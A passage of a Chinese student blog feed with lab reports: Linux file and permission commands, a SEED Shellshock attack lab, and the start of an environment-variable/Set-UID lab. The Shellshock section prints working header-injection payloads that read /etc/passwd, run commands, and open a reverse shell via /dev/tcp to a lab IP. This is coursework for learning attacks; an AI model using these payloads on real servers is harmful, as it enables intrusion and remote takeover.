改变当前目录</h4><p>命令cd使用方式为cd [目录路径名]，用于变换工作目录至指定目录，[目录路径名]可为相对路径，也可以为绝对路径。</p><p><img src="/posts/e11b459a/image-20211029111604450.png" alt="image-20211029111604450"></p><h4 id="3-使用ls命令的各种选项查看文件与目录属性"><a class="markdownIt-Anchor" href="#3-使用ls命令的各种选项查看文件与目录属性"></a> 3. 使用ls命令的各种选项查看文件与目录属性</h4><p>用户经常要查看某个目录中有哪些文件和子目录，这可以使用ls命令来完成。ls命令有非常多的选项，用来修正ls命令的行为，以便满足<br>用户的不同需求。</p><ul><li><p>在最简单的情况下，ls命令可以不带任何实参。这时ls命令将以字母顺序列出当前目录中的所有文件和子目录的名字。</p><ul><li>命令为：$ls</li></ul><p><img src="/posts/e11b459a/image-20211029112513317.png" alt="image-20211029112513317"></p></li><li><p>使用带参数“l”(小写的“L”)的ls命令可以显示当前目录下所有的文件名、文件的类型、文件的访问权限、文件的链接数、文件拥有者及其所属的组、文件大小和文件最近一次被修改的日期和时间等属性。</p><ul><li>命令为：$ls -l</li></ul><p><img src="/posts/e11b459a/image-20211029112536299.png" alt="image-20211029112536299"></p></li><li><p>有些情况下命令ls任何输出，并不表示该目录中没有文件和子目录，因为通常情况下ls命令并不显示隐含文件(或目录) 。要显示隐含文件，可以使用参数“a”的ls命令。</p><ul><li>命令为：$ls -a</li></ul><p><img src="/posts/e11b459a/image-20211029112607485.png" alt="image-20211029112607485"></p></li><li><p>要列出某个目录下的所有文件，包括其任何一层子目录下的文件，可以用带参数“R”的ls命令实现。该命令递归地显示指定目录(或当前目录)下的所有内容。</p><ul><li>命令为：$ls -R</li></ul><p><img src="/posts/e11b459a/image-20211029112705638.png" alt="image-20211029112705638"></p></li></ul><h4 id="4-创建和删除目录"><a class="markdownIt-Anchor" href="#4-创建和删除目录"></a> 4. 创建和删除目录</h4><h5 id="1-创建目录"><a class="markdownIt-Anchor" href="#1-创建目录"></a> (1) 创建目录</h5><p>每个用户在实际中都需要创建自己的目录，这是通过mkdir命令来完成的。</p><p>语法形式为：$ mkdir [-p] dirName，<br>用于建立名称为dirName 之子目录。其中，参数-p确保目录名称存在，不存在的就建一个。</p><p><img src="/posts/e11b459a/image-20211029113441518.png" alt="image-20211029113441518"></p><h5 id="2-删除目录"><a class="markdownIt-Anchor" href="#2-删除目录"></a> (2) 删除目录</h5><p>删除目录的命令为rmdir，使用语法为：$rmdir [dirName]</p><p>作用是删除目录名为dirName的目录。</p><ul><li>注意：rmdir命令不能删除一个非空的目录。</li></ul><p><img src="/posts/e11b459a/image-20211029113655911.png" alt="image-20211029113655911"></p><h4 id="5-创建0长度的文件"><a class="markdownIt-Anchor" href="#5-创建0长度的文件"></a> 5. 创建0长度的文件</h4><p>touch命令用于改变档案的时间记录。touch使用方式touch [-acfm] [-r reference-file] [-t MMDDhhmm [[CC][YY][.ss]] [-dtime] [–date=time] [–time] [–version]file1 [file2 …]</p><p>其中，touch命令的参数为：a改变档案的读取时间记录。m改变档案的修改时间记录。c假如目的档案不存在，不会建立新的档案。r使用参考文件的时间记录。d设定时间与日期。t设定档案的时间记录。</p><p>touch的另外一个功能就是创建一个0长度的文件。<br>例如，使用touch命令在OS目录创建名为myfile1,myfile2的两个文件：<br>$ touch myfile1 myfile2</p><p><img src="/posts/e11b459a/image-20211029114053508.png" alt="image-20211029114053508"></p><h4 id="6-拷贝-移动-重命名及删除文件"><a class="markdownIt-Anchor" href="#6-拷贝-移动-重命名及删除文件"></a> 6. 拷贝、移动、重命名及删除文件</h4><h5 id="1-文件的拷贝"><a class="markdownIt-Anchor" href="#1-文件的拷贝"></a> (1) 文件的拷贝</h5><p>使用cp命令可以将某个文件复制一份，cp命令的一般语法形式为如下：cp &lt;原文件路径名&gt; &lt;新文件路径名&gt;</p><p><img src="/posts/e11b459a/image-20211029114825468.png" alt="image-20211029114825468"></p><h5 id="2-文件的移动和文件的重命名"><a class="markdownIt-Anchor" href="#2-文件的移动和文件的重命名"></a> (2) 文件的移动和文件的重命名</h5><ul><li><p>命令mv可以对某个文件进行改名，以及将某个文件从一个文件夹移动到另一个文件夹。<br>使用方式：mv [-i] &lt;文件原路径&gt; &lt;文件新路径&gt;<br>说明：将一个档案移至另一档案，或将数个档案移至另一目录。<br>参数：-i 若目的地已有同名档案，则先询问是否覆盖旧档</p></li><li><p>改名</p><p><img src="/posts/e11b459a/image-20211029115420223.png" alt="image-20211029115420223"></p></li><li><p>移动</p><p><img src="/posts/e11b459a/image-20211029115710886.png" alt="image-20211029115710886"></p></li></ul><h5 id="3-删除文件"><a class="markdownIt-Anchor" href="#3-删除文件"></a> (3) 删除文件</h5><p>删除文件命令为：rm<br>使用方式：rm [-options] 文件名</p><p>options参数：<br>-i 删除前逐一询问确认。<br>-f 直接删除档案，无需逐一确认。<br>-r 将目录及以下之档案逐一删除。</p><p>示例：</p><p><img src="/posts/e11b459a/image-20211029120134543.png" alt="image-20211029120134543"></p><h4 id="7-查看文件的内容"><a class="markdownIt-Anchor" href="#7-查看文件的内容"></a> 7. 查看文件的内容</h4><p>cat和more这两个命令可以查看文件的内容。</p><h5 id="1-cat命令"><a class="markdownIt-Anchor" href="#1-cat命令"></a> (1) cat命令</h5><ul><li><p>使用方式：cat [-option] fileName</p></li><li><p>参数：</p><p>-n 由1开始对所有输出的行数编号</p><p>-b 和-n 相似，不过对于空白行不编号</p><p><img src="/posts/e11b459a/image-20211029120548660.png" alt="image-20211029120548660"></p><p><img src="/posts/e11b459a/image-20211029120612315.png" alt="image-20211029120612315"></p></li></ul><h5 id="2-more命令"><a class="markdownIt-Anchor" href="#2-more命令"></a> (2) more命令</h5><ul><li><p>使用方式：more [-option] [+/pattern] [+linenum] [fileNames]</p></li><li><p>使用范例</p><p>从第20 行开始显示testfile 之档案内容</p><p><img src="/posts/e11b459a/image-20211029120937071.png" alt="image-20211029120937071"></p><p>查看/etc/passwd文件的内容：</p><p><img src="/posts/e11b459a/image-20211029121012612.png" alt="image-20211029121012612"></p></li></ul><h4 id="8-对文件和目录进行压缩和解压缩"><a class="markdownIt-Anchor" href="#8-对文件和目录进行压缩和解压缩"></a> 8. 对文件和目录进行压缩和解压缩</h4><ul><li><p>压缩文件可以减少所需的存储空间，也可以减少网络传输文件所需的时间，因此压缩和解压缩在Linux中很常用。Linux中压缩和解压缩的指令很多，如gzip、zip、bzip2等等，这里介绍比较常用的gzip指令。</p></li><li><p>使用方法：gzip [-option] [-S &lt;压缩字尾字 符串&gt;] [-&lt;压缩效率&gt;] [–best/fast] [文件]</p></li><li><p>补充说明：gzip是个使用广泛的压缩程序，文件经它压缩过后，其名称后面会多出&quot;.gz&quot;的扩展名。</p></li><li><p>使用范例：</p><ul><li><p>对文件np使用gzip命令进行压缩：<br>$ gzip np</p><p><img src="/posts/e11b459a/image-20211029121428777.png" alt="image-20211029121428777"></p></li><li><p>将np压缩后的文件进行解压缩并列出详细信息<br>$ gzip -dv np.gz</p><p><img src="/posts/e11b459a/image-20211029121510000.png" alt="image-20211029121510000"></p></li><li><p>将goodstuff目录下的所有文件进行压缩：<br>$ gzip -r goodstuff</p><p><img src="/posts/e11b459a/image-20211029121702889.png" alt="image-20211029121702889"></p></li><li><p>对goodstuff目录进行解压缩：<br>$ gzip –dr g oodstuff</p><p><img src="/posts/e11b459a/image-20211029121727712.png" alt="image-20211029121727712"></p></li></ul></li></ul><h2 id="实验3-权限"><a class="markdownIt-Anchor" href="#实验3-权限"></a> 实验3 权限</h2><h3 id="一-实验目的-3"><a class="markdownIt-Anchor" href="#一-实验目的-3"></a> 一、实验目的</h3><p>给学生一个操作文件与目录权限的机会。作完这些练习之后，使学生能够对LINUX中文件所有者的概念和权限的概念有基本的理解。</p><h3 id="二-实验要求-3"><a class="markdownIt-Anchor" href="#二-实验要求-3"></a> 二、实验要求</h3><p>本次实验要求完成下列内容：</p><ul><li>使用长列表命令来查看文件与目录的信息</li><li>能够解释文件与目录权限中各位的含义</li><li>能够对普通文件与目录的权限进行操作</li><li>能够更改文件和目录所属的用户和</li></ul><h3 id="三-实验预备知识-3"><a class="markdownIt-Anchor" href="#三-实验预备知识-3"></a> 三、实验预备知识</h3><p>在linux系统中，每个文件或者一个目录属于一个用户或一个组。Linux权限通过允许每个文件系统对象设置三种独立的权限级别来工作。3种独立的权限级别为：</p><ul><li>文件拥有者(u)；</li><li>文件拥有者所在用户组中的其它成员(g)；</li><li>所有其它用户(o)。</li></ul><p>每个文件均拥有下列三种权限：</p><ul><li>read ®: 查看文件内容</li><li>write (w): 修改文件</li><li>execute (x): 如同命令一样执行文件</li></ul><p>每个目录均拥有下列三种权限：</p><ul><li>read ®: 列出目录内容</li><li>write (w): 在目录中增删文件</li><li>execute (x): 访问目录中的文件</li></ul><p>当你创建一个文件的时候，系统保存了有关该文件的全部信息，包括：</p><ul><li>文件的位置。</li><li>文件类型。</li><li>文件长度。</li><li>哪位用户拥有该文件，哪些用户可以访问该文件。</li><li>i节点。</li><li>文件的修改时间。</li><li>文件的权限位。</li></ul><p>在进行各种操作时，首先必须弄清楚自己所在的目录。如果你对自己目前的位置失去了感觉，那么各种命令可能都会失效。最有效的方法就是，经常使用pwd命令，来查看你所在的当前目录。</p><h3 id="四-实验内容-3"><a class="markdownIt-Anchor" href="#四-实验内容-3"></a> 四、实验内容</h3><h4 id="1-使用长列表命令来查看文件与目录的信息"><a class="markdownIt-Anchor" href="#1-使用长列表命令来查看文件与目录的信息"></a> 1. 使用长列表命令来查看文件与目录的信息</h4><p>对一个文件使用ls –l 命令，就会按如下顺序显示下列信息：</p><ul><li><p>文件类型（第1个字符）</p><ul><li>-: 普通文件</li><li>d: 目录</li><li>l: 符号链接</li><li>c: 字符型设备节点</li><li>b: 块设备节点</li></ul></li><li><p>文件访问权限（接下来的9个字符，每3个一组依次代表user、group和other）</p></li><li><p>文件的硬链接数</p></li><li><p>文件拥有user的用户名</p></li><li><p>文件所属group的用户组名</p></li><li><p>文件的字符数size (bytes)</p></li><li><p>文件的date and time (mtime)</p></li><li><p>文件的name</p></li></ul><p><img src="/posts/e11b459a/image-20211029162532418.png" alt="image-20211029162532418"></p><h4 id="2-解释文件与目录权限中各位的含义"><a class="markdownIt-Anchor" href="#2-解释文件与目录权限中各位的含义"></a> 2. 解释文件与目录权限中各位的含义</h4><p>对于文件a.out</p><p>第一个字符为-，表示它是一个普通文件，接下来9个字符每三位分别代表所有者权限、同组用户权限和其他用户权限，在上例中，九个字符分别为：rwx、rwx、r-x，因此a.out文件具有所有者类中的读写和执行权限，对于组类也有读写和执行权限，而对于其他用户类也只有读和执行权限。</p><p>后面的信息依次表示a.out文件的硬链接数为1，文件所属的用户名为zino，文件所属组名为zino，文件大小为16696byte，最后是文件创建的时间为6月21日19:22和文件名为a.out。</p><h4 id="3-对普通文件与目录的权限进行操作"><a class="markdownIt-Anchor" href="#3-对普通文件与目录的权限进行操作"></a> 3. 对普通文件与目录的权限进行操作</h4><p>改变文件权限的命令是chmod</p><ul><li><p>chmod命令的一般格式为:  chmod [who] operator [permission] filename</p></li><li><p>who 的含义是：</p><ul><li>u 文件属主权限。</li><li>g 同组用户权限。</li><li>o 其他用户权限。</li><li>a 所有用户(所有者、同组用户及其他用户)。</li></ul></li><li><p>operator的含义：</p><ul><li>+  增加权限。</li><li>-   取消权限。</li><li>=  设定权限。</li></ul></li><li><p>permission的含义：</p><ul><li>r 读权限。</li><li>w 写权限。</li><li>x 执行权限。</li><li>s 文件属主和组set-ID。</li><li>t 粘性位*。</li><li>l 给文件加锁，使其他用户无法访问。</li></ul></li><li><p>举例：<br>$chmod a-x  a.out  收回所有用户的执行权限</p><p><img src="/posts/e11b459a/image-20211029165852610.png" alt="image-20211029165852610"></p><p>$chmod u+x myfile  赋予文件属主执行</p><p><img src="/posts/e11b459a/image-20211029165929699.png" alt="image-20211029165929699"></p></li></ul><p>上面所述的改变用户权限的方法被称为权限符号法，还有一种更为简便的方法用来更改用户权限：<strong>二进制掩码法</strong>(绝对方法)。</p><ul><li><p>含义</p><p>绝对方法就是使用八进制数字作为掩码来设置不同的文件权限。每个八进制数字应用于一种用户类。你可以将这个数字想象为从所有者类开始从左到右与权限类别相匹配。</p><p><strong>第一个八进制数字应用于所有者类，第二个是同组类，而第三个是其他用户类</strong>。</p><p>你所选择的实际的八进制数字可以为每个用户类确定读、写和执行权限。从这一点上说，需要了解八进制数字是如何转换为二进制格式的。<br>可以认为首先将八进制数转换为二进制格式，然后每个三位二进制数字用于设置读、写和执行权限。每个二进制数字从左到右和相应的权限相匹配。如果一个二进制数字是0，那么该权限则被禁止，如果是1则被打开。第一个二进制位设置了读权限的打开与关闭，第二个设置了写权限，第三个设置了执行权限。<br>例如，一个八进制数字6转换为二进制数字110。这会将读写权限打开，执行权限关闭</p><p>由八进制到二进制的转换很麻烦，这里有个简便方法：如果赋予读权限，算4；如果赋予写权限，算2；如果赋予执行权，算1；将这些数字累加起来，如果同时拥有读取和写权限，<br>那就是2+4=6，也就是二进制里面的110。</p></li><li><p>举例：</p><p>$chmod 666 myfile ：<br>赋予所有用户读和写的权限(读+写=2+4=6)</p><p><img src="/posts/e11b459a/image-20211029170150062.png" alt="image-20211029170150062"></p><p>$chmod 744 myfile ：<br>赋予文件所有者读、写和执行的权限(读+写+执行=1+2+4=7)，所有其他用户读的权限(读＝4)。</p><p><img src="/posts/e11b459a/image-20211029170209608.png" alt="image-20211029170209608"></p></li></ul><h4 id="4-更改文件和目录所属的用户和组"><a class="markdownIt-Anchor" href="#4-更改文件和目录所属的用户和组"></a> 4. 更改文件和目录所属的用户和组</h4><p>改变文件所有者的命令是chown</p><ul><li><p>chown命令的一般形式为：chown -R -h owner file</p></li><li><p>-R选项意味着对所有子目录下的文件也都进行同样的操作。</p></li><li><p>-h选项意味着在改变符号链接文件的属主时不影响该链接所指向的目标文件。</p></li><li><p>举例</p><p>在终端中运行：$ls –l a.out<br>我们可以看到文件的拥有者是zino。<br>接着运行：$ chown root a.out<br>运行完成后我们继续运行：$ ls –l a.out<br>我们可以看到文件的拥有者是root。</p><p><img src="/posts/e11b459a/image-20211029171209781.png" alt="image-20211029171209781"></p></li></ul><p>改变文件所有组的命令为chgrp</p><ul><li><p>chgrp命令的使用方式与chown基本相同：chgrp –R –h group file</p></li><li><p>-R选项意味着对所有子目录下的文件也都进行同样的操作。</p></li><li><p>-h选项意味着在改变符号链接文件的所属组时不影响该链接所指向的目标文件。</p></li><li><p>举例：在终端中运行：$ ls –l a.out<br>我们可以看出文件所属的用户组为zino。<br>接着运行：$ chgrp root a.out<br>然后继续运行：$ ls –l a.out<br>可以看出文件的所属的组为root。</p><p><img src="/posts/e11b459a/image-20211029171327096.png" alt="image-20211029171327096"></p></li><li><p>提示：</p><ul><li><p>如果你想知道自己属于哪几个用户组，可以使用group<br>和id命令：<br>$ group 或<br>$ id</p><p><img src="/posts/e11b459a/image-20211029172200328.png" alt="image-20211029172200328"></p></li><li><p>如果想要知道其它用户属于哪几个用户组，就在group<br>命令后面接上用户名，如：<br>$ group aifi<br>​$ users admin general<br>上面的命令告诉我们，aifi属于users、admin和general这三个用户组。</p></li><li><p>cat /etc/group  查看分组</p><p><img src="/posts/e11b459a/image-20211029172141101.png" alt="image-20211029172141101"></p></li></ul></li></ul>]]></content>
    
    
    <categories>
      
      <category>Course Study</category>
      
      <category>操作系统</category>
      
    </categories>
    
    
    <tags>
      
      <tag>操作系统</tag>
      
      <tag>Lab</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>软件安全Lab2-Shellshock Attack</title>
    <link href="/posts/35f73974/"/>
    <url>/posts/35f73974/</url>
    
    <content type="html"><![CDATA[<h1 id="shellshock_attack_lab"><a class="markdownIt-Anchor" href="#shellshock_attack_lab"></a> Shellshock_Attack_lab</h1><h2 id="task-1"><a class="markdownIt-Anchor" href="#task-1"></a> task 1</h2><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-comment">//vul.c</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span>&#123;<br>setuid(geteuid());<br>system(<span class="hljs-string">&quot;/bin/ls -l&quot;</span>);<br>&#125;<br></code></pre></div></td></tr></table></figure><p>首先准备有漏洞的程序vul.c</p><p>然后我们编译运行，并将其变成一个set-UID程序</p><p>因为Ubuntu20.04中/bin/sh指向/bin/dash，而这个程序没有shellshock漏洞，所以需要更改符号链接，采用命令</p><p><code>sudo ln -sf /bin/bash_shellshock /bin/sh</code></p><p>同时我们发现20.04中/bin文件夹下没有bash_shellshock文件，所以我们需要sudo su进入root后自己cp一下。</p><p>我们定义一个shell变量foo并输出它，这样当运行set-UID程序（vul)时，shell变量会变成子进程的环境变量。由于system函数的原因，Bash会被调用，它监测到环境变量foo中存放了一个环境声明，因此会解析该声明，由于逻辑解析的漏洞，它最终会执行放在末尾的/bin/sh指令，所以我之后会成功进入一个具有root权限的shell程序。</p><p><img src="/posts/35f73974/image-20211027172958405.png" alt="image-20211027172958405"></p><p><img src="/posts/35f73974/image-20211027173023492.png" alt="image-20211027173023492"></p><p>将链接改回去后再次执行vul,我们发现程序正常，没有被攻击。</p><p><img src="/posts/35f73974/image-20211027174008884.png" alt="image-20211027174008884"></p><h2 id="task-2"><a class="markdownIt-Anchor" href="#task-2"></a> task 2</h2><h3 id="task-2a-using-brower"><a class="markdownIt-Anchor" href="#task-2a-using-brower"></a> task 2.A: Using brower</h3><p><img src="/posts/35f73974/image-20211027180800482.png" alt="image-20211027180800482"></p><p><img src="/posts/35f73974/image-20211027180830505.png" alt="image-20211027180830505"></p><p>Apache服务器会从http请求头中获取信息，赋值给CGI程序的环境变量。</p><h3 id="task-2b-using-curl"><a class="markdownIt-Anchor" href="#task-2b-using-curl"></a> task 2.B Using curl</h3><figure class="highlight awk"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs awk">curl -v www.seedlab-shellshock.com<span class="hljs-regexp">/cgi-bin/g</span>etenv.cgi<br></code></pre></div></td></tr></table></figure><p>-v  打印出http请求头</p><p><img src="/posts/35f73974/image-20211028162819689.png" alt="image-20211028162819689"></p><figure class="highlight awk"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs awk">curl -A <span class="hljs-string">&quot;my data&quot;</span> -v www.seedlab-shellshock.com<span class="hljs-regexp">/cgi-bin/g</span>etenv.cgi<br></code></pre></div></td></tr></table></figure><p>-A  设置User-Agent</p><p><img src="/posts/35f73974/image-20211028162913084.png" alt="image-20211028162913084"></p><figure class="highlight awk"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs awk">curl -e <span class="hljs-string">&quot;my data&quot;</span> -v www.seedlab-shellshock.com<span class="hljs-regexp">/cgi-bin/g</span>etenv.cgi<br></code></pre></div></td></tr></table></figure><p>-e 设置Referer字段</p><p><img src="/posts/35f73974/image-20211028163009475.png" alt="image-20211028163009475"></p><figure class="highlight awk"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs awk">curl -H <span class="hljs-string">&quot;AAAAAA: BBBBBB&quot;</span> -v www.seedlab-shellshock.com<span class="hljs-regexp">/cgi-bin/g</span>etenv.cgi<br></code></pre></div></td></tr></table></figure><p>-H 设置额外头字段</p><p><img src="/posts/35f73974/image-20211028163108646.png" alt="image-20211028163108646"></p><h2 id="task-3"><a class="markdownIt-Anchor" href="#task-3"></a> task 3</h2><h3 id="task-3a"><a class="markdownIt-Anchor" href="#task-3a"></a> Task 3.A:</h3><ul><li><strong>Get the server to send back the content of the /etc/passwd file.</strong></li></ul><p>利用了-A修改User-Agent字段</p><p>执行命令</p><p><code>curl -A &quot;() &#123; echo hello; &#125;; echo Content_type: text/plain; echo; /bin/cat /etc/passwd&quot; http://www.seedlab-shellshock.com/cgi-bin/vul.cgi</code></p><p><img src="/posts/35f73974/image-20211028165749466.png" alt="image-20211028165749466"></p><h3 id="task-3b"><a class="markdownIt-Anchor" href="#task-3b"></a> Task 3.B:</h3><p><strong>Get the server to tell you its process’ user ID. Y ou can use the /bin/id command to print out the ID information.</strong></p><p>利用-e修改Referer字段来获取ID</p><p>执行命令</p><p><code>curl -e &quot;() &#123; echo hello; &#125;; echo Content_type: text/plain; echo; /bin/id&quot; http://www.seedlab-shellshock.com/cgi-bin/vul.cgi</code></p><p><img src="/posts/35f73974/image-20211028170325981.png" alt="image-20211028170325981"></p><h3 id="task-3c"><a class="markdownIt-Anchor" href="#task-3c"></a> Task 3.C:</h3><p><strong>Get the server to create a file inside the /tmp folder. Y ou need to get into the container to see whether the file is created or not, or use another Shellshock attack to list the /tmp folder.</strong></p><p><img src="/posts/35f73974/image-20211028172005730.png" alt="image-20211028172005730"></p><p>利用-H创建额外头字段</p><p>查看tmp</p><p><code>curl -H &quot;test: () &#123; echo hello; &#125;; echo Content_type: text/plain; echo; /bin/ls /tmp &quot; http://www.seedlab-shellshock.com/cgi-bin/vul.cgi</code></p><p>创建test</p><p><code>curl -H &quot;test: () &#123; echo hello; &#125;; echo Content_type: text/plain; echo; /bin/touch /tmp/test &quot; http://www.seedlab-shellshock.com/cgi-bin/vul.cgi</code></p><p><img src="/posts/35f73974/image-20211028193945048.png" alt="image-20211028193945048"></p><h3 id="task-3d"><a class="markdownIt-Anchor" href="#task-3d"></a> Task 3.D:</h3><p><strong>Get the server to delete the file that you just created inside the /tmp folder</strong></p><p>删除test</p><p><code>curl -H &quot;test: () &#123; echo hello; &#125;; echo Content_type: text/plain; echo; /bin/rm /tmp/test &quot; http://www.seedlab-shellshock.com/cgi-bin/vul.cgi</code></p><p><img src="/posts/35f73974/image-20211028194013384.png" alt="image-20211028194013384"></p><p>Q1:不能打开/etc/shadow，因为只是www-data权限，权限不够，需要root权限</p><p>Q2：不能成功，不能成功将带空格的字符串设置为环境变量，所以不能攻击成功</p><h2 id="test-4"><a class="markdownIt-Anchor" href="#test-4"></a> test 4</h2><p><code>nc -lvnp 9090</code></p><p><img src="/posts/35f73974/image-20211028205201563.png" alt="image-20211028205201563"></p><p><code>curl -A &quot;() &#123; echo hello;&#125;; echo Content_type: text/plain; echo; echo; /bin/bash -i &gt; /dev/tcp/10.9.0.1/9090 0&lt;&amp;1 2&gt;&amp;1&quot; http://10.9.0.80/cgi-bin/vul.cgi</code></p><p><img src="/posts/35f73974/image-20211028205013091.png" alt="image-20211028205013091"></p><p><img src="/posts/35f73974/image-20211028205206476.png" alt="image-20211028205206476"></p><h2 id="test-5"><a class="markdownIt-Anchor" href="#test-5"></a> test 5</h2><p>新建一个vul.cgi修改为bash后，重新dcbuild一个容器，后再次执行攻击，发现攻击无法成功。因为bash填补了shellshock漏洞，所以无法攻击成功。</p><p><img src="/posts/35f73974/image-20211028211429143.png" alt="image-20211028211429143"></p>]]></content>
    
    
    <categories>
      
      <category>Course Study</category>
      
      <category>软件安全</category>
      
    </categories>
    
    
    <tags>
      
      <tag>软件安全</tag>
      
      <tag>Lab</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>软件安全Lab1-Environment Variable and Set-UID Program</title>
    <link href="/posts/3c8e3d23/"/>
    <url>/posts/3c8e3d23/</url>
    
    <content type="html"><![CDATA[<h1 id="environment-variable-and-set-uid-program-lab"><a class="markdownIt-Anchor" href="#environment-variable-and-set-uid-program-lab"></a> Environment Variable and Set-UID Program Lab</h1><h2 id="task-1"><a class="markdownIt-Anchor" href="#task-1"></a> Task 1</h2><p><img src="/posts/3c8e3d23/image-20211021190558511.png" alt="image-20211021190558511"></p><ul><li><p>使用<code>printenv</code>打印环境变量</p><p><img src="/posts/3c8e3d23/image-20211021190734705.png" alt="image-20211021190734705"></p></li><li><p>使用<code>export</code>设置环境变量的值,用<code>echo</code>查看设置结果</p><p><img src="/posts/3c8e3d23/image-20211021192046493.png" alt="image-20211021192046493"></p></li><li><p>使用<code>unset</code>删除环境变量，用<code>echo</code>查看设置结果</p><p><img src="/posts/3c8e3d23/image-20211021192112022.png" alt="image-20211021192112022"></p></li></ul><h2 id="task-2"><a class="markdownIt-Anchor" href="#task-2"></a> Task 2</h2><h3 id="step-1"><a class="markdownIt-Anchor" href="#step-1"></a> Step 1.</h3><p>首先编译<code>myprintenv.c</code>文件</p><p>然后结果保存在<code>file</code>中</p><p><img src="/posts/3c8e3d23/image-20211021192345242.png" alt="image-20211021192345242"></p><p>观察file文件，我们可以发现是各个环境变量的值</p><p><img src="/posts/3c8e3d23/image-20211021192715013.png" alt="image-20211021192715013"></p><h3 id="step-2"><a class="markdownIt-Anchor" href="#step-2"></a> Step 2</h3><p>按照要求注释掉子进程的printenv语句，将父进程的printenv语句取消注释</p><p>重新编译，将结果保存在file2文件中，发现同样是环境变量的值</p><p><img src="/posts/3c8e3d23/image-20211021194639135.png" alt="image-20211021194639135"></p><h3 id="step-3"><a class="markdownIt-Anchor" href="#step-3"></a> Step 3</h3><p>用diff命令比较file和file2的差异，发现两者是相同的，说明子进程完全继承了父进程的环境变量。</p><p><img src="/posts/3c8e3d23/image-20211021194823695.png" alt="image-20211021194823695"></p><p>进一步查阅资料可知</p><p>子进程完全复制了父进程的资源，包括进程上下文、代码区、数据区、堆区、栈区、内存信息、打开文件的文件描述符、信号处理函数、进程优先级、进程组号、当前工作目录、根目录、资源限制和控制终端等信息，而子进程与父进程的区别有进程号、资源使用情况和计时器等。</p><h2 id="task-3"><a class="markdownIt-Anchor" href="#task-3"></a> Task 3</h2><h3 id="step-1-2"><a class="markdownIt-Anchor" href="#step-1-2"></a> Step 1</h3><p>编译运行myenv.c，发现结果为空</p><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;unistd.h&gt;</span></span><br><br><span class="hljs-keyword">extern</span> <span class="hljs-keyword">char</span> **environ;<br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>  <span class="hljs-keyword">char</span> *argv[<span class="hljs-number">2</span>];<br><br>  argv[<span class="hljs-number">0</span>] = <span class="hljs-string">&quot;/usr/bin/env&quot;</span>;<br>  argv[<span class="hljs-number">1</span>] = <span class="hljs-literal">NULL</span>;<br><br>  <span class="hljs-built_in">execve</span>(<span class="hljs-string">&quot;/usr/bin/env&quot;</span>, argv, <span class="hljs-literal">NULL</span>);  <br><br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span> ;<br>&#125;<br></code></pre></div></td></tr></table></figure><p><img src="/posts/3c8e3d23/image-20211021195206499.png" alt="image-20211021195206499"></p><h3 id="step-2-2"><a class="markdownIt-Anchor" href="#step-2-2"></a> Step 2</h3><p>将代码修改为如下方所示的代码后，再次编译运行</p><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;unistd.h&gt;</span></span><br><br><span class="hljs-keyword">extern</span> <span class="hljs-keyword">char</span> **environ;<br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>  <span class="hljs-keyword">char</span> *argv[<span class="hljs-number">2</span>];<br><br>  argv[<span class="hljs-number">0</span>] = <span class="hljs-string">&quot;/usr/bin/env&quot;</span>;<br>  argv[<span class="hljs-number">1</span>] = <span class="hljs-literal">NULL</span>;<br><br>  <span class="hljs-comment">//execve(&quot;/usr/bin/env&quot;, argv, NULL);  </span><br>  <span class="hljs-built_in">execve</span>(<span class="hljs-string">&quot;/usr/bin/env&quot;</span>, argv, environ);<br><br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span> ;<br>&#125;<br></code></pre></div></td></tr></table></figure><p>发现程序打印出了环境变量的值。</p><p><img 